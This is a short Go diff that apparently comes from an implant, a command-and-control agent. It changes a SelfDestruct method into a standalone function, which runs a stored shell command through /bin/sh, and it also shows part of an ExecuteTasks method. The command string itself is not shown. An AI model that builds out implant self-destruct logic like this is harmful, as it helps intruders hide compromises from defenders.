@@ -186,6 +186,6 @@ func (i *Implant) ExecuteTasks() {
 	}
 }
 
-func (i *Implant) SelfDestruct() error {
+func SelfDestruct() error {
 	return exec.Command("/bin/sh", "-c", selfDestruct).Run()
 }
